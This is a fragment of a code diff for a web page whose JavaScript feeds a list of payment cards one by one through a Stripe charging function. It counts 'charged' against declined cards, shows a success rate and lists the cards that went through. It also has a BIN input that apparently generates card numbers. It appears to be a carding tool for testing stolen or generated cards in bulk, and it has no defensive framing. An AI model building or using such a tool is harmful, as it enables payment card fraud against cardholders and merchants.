+  document.getElementById('stripeStatRate').textContent = '0%';
+  
+  for (let i = 0; i < lines.length && isStripeChecking; i++) {
+    if (!isStripeChecking) break;
+    
+    const progress = ((i + 1) / lines.length) * 100;
+    document.getElementById('stripeProgressFill').style.width = `${progress}%`;
+    document.getElementById('stripeProgressText').textContent = `${i + 1}/${lines.length}`;
+    
+    const result = await chargeCardStripe(lines[i]);
+    stripeResults.push(result);
+    
+    const chargedCount = stripeResults.filter(r => r.status === 'CHARGED').length;
+    const declinedCount = stripeResults.length - chargedCount;
+    document.getElementById('stripeStatCharged').textContent = chargedCount;
+    document.getElementById('stripeStatDeclined').textContent = declinedCount;
+    document.getElementById('stripeStatRate').textContent = 
+      stripeResults.length > 0 ? Math.round((chargedCount / stripeResults.length) * 100) + '%' : '0%';
+    
+    const responseHtml = formatStripeResponse(result, i);
+    document.getElementById('stripeOutput').innerHTML += responseHtml;
+    
+    const output = document.getElementById('stripeOutput');
+    output.scrollTop = output.scrollHeight;
+    
+    if (document.getElementById('chargedOnlyView').style.display !== 'none') {
+      renderChargedCards();
+    }
+    
+    await new Promise(resolve => setTimeout(resolve, 500));
+  }
+  
+  document.getElementById('stripeCheckingStatus').style.display = 'none';
+  document.getElementById('stripeProgressFill').style.width = '100%';
+  
+  isStripeChecking = false;
+  showToast(`Charged ${lines.length} cards`);
+}
+
+function stopStripeCharge() {
+  isStripeChecking = false;
+  document.getElementById('stripeCheckingStatus').style.display = 'none';
+  showToast('Charging stopped');
+}
+
+function clearStripeCharge() {
+  document.getElementById('stripeInput').value = '';
+  
+  document.getElementById('stripeStatTotal').textContent = '0';
+  document.getElementById('stripeStatCharged').textContent = '0';
+  document.getElementById('stripeStatDeclined').textContent = '0';
+  document.getElementById('stripeStatRate').textContent = '0%';
+  
+  document.getElementById('stripeProgressFill').style.width = '0%';
+  document.getElementById('stripeProgressText').textContent = '';
+  
+  document.getElementById('stripeOutput').innerHTML = '<div class="empty-state">No charges performed yet</div>';
+  document.getElementById('chargedCardsOutput').innerHTML = '<div class="empty-state">No charged cards found</div>';
+  
+  document.getElementById('stripeCheckingStatus').style.display = 'none';
+  
+  stripeResults = [];
+  isStripeChecking = false;
+}
+
+function showToast(message) {
+  const toast = document.getElementById('toast');
+  document.getElementById('toastMessage').textContent = message;
+  toast.classList.add('show');
+  
+  setTimeout(() => {
+    toast.classList.remove('show');
+  }, 3000);
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('binInput').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') generate();
+  });
+  
+  document.getElementById('countInput').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') generate();
+  });
+});
+</script>
+</body>
+</html>
